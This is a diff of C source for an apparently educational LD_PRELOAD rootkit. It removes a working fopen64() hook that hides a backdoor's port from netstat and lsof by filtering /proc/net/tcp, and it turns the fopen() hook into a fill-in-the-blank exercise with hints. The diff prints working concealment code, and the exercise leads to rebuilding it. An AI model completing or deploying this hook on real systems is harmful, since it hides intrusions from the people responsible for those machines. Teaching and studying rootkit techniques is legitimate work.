@@ -209,59 +209,12 @@ struct dirent64 *readdir64(DIR *dirp)
 }
 
 
+/**
+* TODO: complete fopen() by replacing all TODOs
+*
 
 /**
-* TODO: Get them to complete fopen64() and fopen()
-*
-
-/**
-* fopen64() is the same as fopen() but supports large files
-*
-* From the manpage: The fopen64() function is identical to the 
-* fopen() function except that the underlying file descriptor is 
-* created with the O_LARGEFILE flag set. The fopen64() function is a part of 
-* the large-file extensions.
-*
-* The code for fopen() and fopen64() should be nearly identical.
-*/
-FILE *(*orig_fopen64)(const char *pathname, const char *mode);
-FILE *fopen64(const char *pathname, const char *mode)
-{
-	orig_fopen64 = dlsym(RTLD_NEXT, "fopen64");
-
-	char *ptr_tcp = strstr(pathname, "/proc/net/tcp");
-
-	FILE *fp;
-
-	if (ptr_tcp != NULL)
-	{
-		char line[256];
-		FILE *temp = tmpfile64();
-		fp = orig_fopen64(pathname, mode);
-		while (fgets(line, sizeof(line), fp))
-		{
-			char *listener = strstr(line, KEY_PORT);
-			if (listener != NULL)
-			{
-				continue;
-			}
-			else
-			{
-				fputs(line, temp);
-			}
-		}
-		return temp;
-	}
-
-	fp = orig_fopen64(pathname, mode);
-	return fp;
-}
-
-
-
-
-/**
-*
+* 
 * Hooking fopen() to hide backdoor connection from netstat (and lsof)
 *
 * netstat reads tcp connection input from /proc/net/tcp
@@ -276,9 +229,9 @@ FILE *fopen64(const char *pathname, const char *mode)
 FILE *(*orig_fopen)(const char *pathname, const char *mode);
 FILE *fopen(const char *pathname, const char *mode)
 {
-	orig_fopen = dlsym(RTLD_NEXT, "fopen");
+	orig_fopen = dlsym(RTLD_NEXT, "TODO");      //Hint: what is the name of the function we are hooking?
 
-	char *ptr_tcp = strstr(pathname, "/proc/net/tcp");
+	char *ptr_tcp = strstr(pathname, "TODO");   //Hint: what is the path for tcp connection inputs?
 
 	FILE *fp;
 
@@ -289,15 +242,14 @@ FILE *fopen(const char *pathname, const char *mode)
 		fp = orig_fopen(pathname, mode);
 		while (fgets(line, sizeof(line), fp))
 		{
-			char *listener = strstr(line, KEY_PORT); 
-			if (listener != NULL)
+			char *listener = strstr(line, TODO); //Hint: what port goes here?
+			if (listener == NULL)
 			{
-				continue;
+				fputs(TODO, TODO); //Hint: we want to still show all other connections
 			}
-			else
-			{
-				fputs(line, temp);
-			}
+            
+            //Otherwise, fopen ignores this connection (Nothing to do here)
+
 		}
 		return temp;
 
